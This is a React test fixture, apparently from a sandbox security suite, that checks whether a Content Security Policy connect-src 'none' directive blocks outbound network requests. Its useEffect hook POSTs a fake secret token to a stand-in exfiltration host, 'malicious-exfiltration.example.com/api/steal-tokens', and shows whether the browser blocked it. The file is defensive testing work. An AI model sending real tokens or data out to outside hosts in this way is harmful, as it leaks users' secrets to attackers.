import React, { useState, useEffect } from 'react';

/**
 * Security Fixture: Network Exfiltration Attempt
 *
 * Verifies that the Content Security Policy directive connect-src 'none'
 * strictly prevents outbound fetch or XHR requests from sandboxed code.
 */
export default function SecurityNetworkExfiltrationFixture() {
  const [networkResult, setNetworkResult] = useState<string>('Initiating network fetch...');
  const [isBlocked, setIsBlocked] = useState<boolean>(false);

  useEffect(() => {
    fetch('https://malicious-exfiltration.example.com/api/steal-tokens', {
      method: 'POST',
      body: JSON.stringify({ leaked: 'secret-token' }),
    })
      .then((res) => {
        setNetworkResult(`SECURITY BREACH: Network request succeeded with status ${res.status}`);
        setIsBlocked(false);
      })
      .catch((err: unknown) => {
        // Expected: Failed to fetch / CSP connect-src violation
        const msg = err instanceof Error ? err.message : String(err);
        setNetworkResult(`CSP ENFORCED: Blocked outbound network connection (${msg})`);
        setIsBlocked(true);
      });
  }, []);

  return (
    <div className="p-6 max-w-md mx-auto bg-white rounded-xl shadow-md space-y-4 border border-gray-200">
      <h2 className="text-lg font-bold text-gray-900" data-testid="network-security-title">
        Outbound Network Access Probe
      </h2>
      <p className="text-sm text-gray-600">
        Tests CSP <code className="bg-gray-100 px-1 py-0.5 rounded font-mono text-xs">connect-src &apos;none&apos;</code> enforcement against outbound HTTP requests.
      </p>

      <div
        data-testid="network-probe-result"
        className={`p-3 rounded-md border text-xs font-mono whitespace-pre-wrap ${
          isBlocked
            ? 'bg-green-50 border-green-300 text-green-800'
            : 'bg-red-50 border-red-300 text-red-800'
        }`}
      >
        {networkResult}
      </div>

      <div className="text-xs text-gray-500">
        Network Policy: <span data-testid="network-isolation-status" className="font-bold">{isBlocked ? 'BLOCKED' : 'PERMITTED'}</span>
      </div>
    </div>
  );
}
